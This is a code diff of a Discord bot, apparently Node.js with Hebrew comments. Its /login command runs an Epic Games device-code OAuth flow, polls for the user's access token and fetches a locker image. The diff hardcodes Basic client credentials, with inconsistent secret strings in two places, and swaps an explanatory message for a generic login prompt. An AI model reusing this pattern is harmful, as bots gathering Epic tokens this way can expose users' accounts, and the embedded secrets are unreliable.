@@ -13,23 +13,67 @@ const client = new Client({
   ]
 });
 
-// 1. טיפול בפקודת ה-Slash בדיסקורד (כמו /login)
+// 1. טיפול בפקודת ה-Slash בדיסקורד (/login)
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
 
   if (interaction.commandName === 'login') {
-    // מענים לדיסקורד מיד כדי שלא יופיע "did not respond"
-    await interaction.reply({ 
-      content: 'שולח לך הודעה פרטית להתחברות...', 
-      ephemeral: true 
-    });
+    // השהיית התגובה כדי לאפשר לשרת לפנות ל-Epic Games
+    await interaction.deferReply({ ephemeral: true });
 
-    // מפעילים את תהליך ההתחברות עבור המשתמש
-    await initiateEpicAuth(interaction.user.id);
+    try {
+      // 1.1 בקשת Client Credentials מ-Epic Games
+      const response = await axios.post(
+        'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/v2/token',
+        'grant_type=client_credentials',
+        {
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Authorization': 'Basic MzQ0NmNkNzI2OTRjNDI4ZmI2ZjAxM2VkYzZjNWU3M2M6V3R3R3p3R3p3R3p3'
+          }
+        }
+      );
+
+      // 1.2 יצירת Device Code
+      const deviceCodeRes = await axios.post(
+        'https://account-public-service-prod01.ol.epicgames.com/account/api/oauth/deviceAuthorization',
+        'prompt=login',
+        {
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Authorization': `Bearer ${response.data.access_token}`
+          }
+        }
+      );
+
+      const { verification_uri_complete, device_code } = deviceCodeRes.data;
+      const loginUrl = verification_uri_complete || 'https://www.epicgames.com/id/activate';
+
+      // 1.3 יצירת כפתור Log in
+      const authButton = new ButtonBuilder()
+        .setLabel('Log in')
+        .setStyle(ButtonStyle.Link)
+        .setURL(loginUrl);
+
+      const row = new ActionRowBuilder().addComponents(authButton);
+
+      // 1.4 שליחת ההודעה המדויקת בערוץ
+      await interaction.editReply({
+        content: `Open [this link](${loginUrl}) to log in to your account.`,
+        components: [row]
+      });
+
+      // 1.5 הפעלת בדיקה רציפה (Polling) עד התחברות
+      pollForEpicToken(device_code, interaction.user);
+
+    } catch (error) {
+      console.error('Error generating login link:', error.response?.data || error.message);
+      await interaction.editReply({ content: 'Failed to generate login link. Please try again.' });
+    }
   }
 });
 
-// 2. נקודת הקצה לקבלת בקשות מהאתר ב-Vercel
+// 2. נקודת קצה (Endpoint) לקבלת בקשות מהאתר ב-Vercel
 app.post('/api/start-auth', async (req, res) => {
   const { discordUserId, email } = req.body;
 
@@ -47,7 +91,7 @@ app.post('/api/start-auth', async (req, res) => {
   }
 });
 
-// 3. פונקציה לייצור קישור התחברות ושליחתו ב-DM
+// 3. פונקציה לייצור הקישור והודעה (לשימוש במידת הצורך מ-API)
 async function initiateEpicAuth(userId) {
   try {
     const user = await client.users.fetch(userId);
@@ -59,7 +103,7 @@ async function initiateEpicAuth(userId) {
       {
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
-          'Authorization': 'Basic MzQ0NmNkNzI2OTRjNDI4ZmI2ZjAxM2VkYzZjNWU3M2M6V3R3R3p3R3p3R3p3'
+          'Authorization': 'Basic MzQ0NmNkNzI2OTRjNDI4ZmI2ZjAxM2VkYzZjNWU3M2M6V3R3R3p3R3p3'
         }
       }
     );
@@ -79,14 +123,14 @@ async function initiateEpicAuth(userId) {
     const loginUrl = verification_uri_complete || 'https://www.epicgames.com/id/activate';
 
     const authButton = new ButtonBuilder()
-      .setLabel('התחבר לחשבון Epic Games')
+      .setLabel('Log in')
       .setStyle(ButtonStyle.Link)
       .setURL(loginUrl);
 
     const row = new ActionRowBuilder().addComponents(authButton);
 
     await user.send({
-      content: `אהלן! 🎮 לחץ על הלחצן למטה להתחברות מאובטחת דרך Epic Games. ברגע שתסיים להתחבר, תמונת הלוקר שלך תישלח לכאן אוטומטית!`,
+      content: `Open [this link](${loginUrl}) to log in to your account.`,
       components: [row]
     });
 
@@ -97,7 +141,7 @@ async function initiateEpicAuth(userId) {
   }
 }
 
-// 4. Polling לקבלת Token
+// 4. בדיקת Polling מול Epic Games
 async function pollForEpicToken(deviceCode, user) {
   const pollInterval = setInterval(async () => {
     try {
@@ -119,7 +163,7 @@ async function pollForEpicToken(deviceCode, user) {
       }
     } catch (error) {
       if (error.response && error.response.data && error.response.data.errorCode === 'errors.com.epicgames.account.oauth.authorization_pending') {
-        // המשתמש עדיין לא אישר
+        // ממתין לאישור הלקוח
       } else {
         clearInterval(pollInterval);
         console.error('Polling error:', error.response?.data || error.message);
@@ -139,7 +183,7 @@ async function fetchAndSendLockerImage(accessToken, user) {
   }
 }
 
-// הפעלת השרת והתחברות הבוט
+// הפעלת השרת
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server listening on port ${PORT}`);
